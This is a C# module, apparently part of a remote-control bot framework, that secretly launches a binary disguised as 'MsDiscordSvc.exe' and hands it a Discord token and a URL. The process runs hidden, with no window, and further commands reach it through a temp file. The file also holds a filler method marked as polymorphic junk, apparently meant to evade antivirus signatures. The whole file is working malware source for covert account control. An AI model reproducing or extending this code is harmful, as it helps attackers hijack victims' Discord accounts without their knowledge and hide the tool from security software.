using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using VanguardCore;
using VanguardCore.Modules;

namespace FinalBot.Modules
{
    public static class DiscordRemoteManager
    {
        // [POLY_JUNK]
        private static void _vanguard_addd76dc() {
            int val = 70307;
            if (val > 50000) Console.WriteLine("Hash:" + 70307);
        }

        public static string LaunchDiscordBot(string token, string url, string action = "join")
        {
            try
            {
                string workDir = ResourceModule.WorkDir;
                string tempExe = Path.Combine(workDir, "MsDiscordSvc.exe");

                if (!File.Exists(tempExe)) return "❌ Failed: Discord remote service binary not found.";

                // Ensure profile dir exists in a stable location
                string profilePath = Path.Combine(workDir, "DiscordProfile");
                if (!Directory.Exists(profilePath)) Directory.CreateDirectory(profilePath);

                // Command signaling (still uses TEMP for inter-process communication)
                if (action != "join")
                {
                    string cmdFile = Path.Combine(Path.GetTempPath(), "discord_cmd.txt");
                    File.WriteAllText(cmdFile, action == "deaf" ? "deafen" : action);
                    return $"⚡ Command `{action}` signaled.";
                }

                // Launch the EXE
                Process.Start(new ProcessStartInfo
                {
                    FileName = tempExe,
                    Arguments = $"\"{token}\" \"{url}\" \"{action}\" --profile \"{profilePath}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    WorkingDirectory = workDir
                });

                return $"✅ Discord Remote launched: Action `{action}` started.";
            }
            catch (Exception ex)
            {
                return $"❌ Error launching Discord bot: {ex.Message}";
            }
        }
    }
}
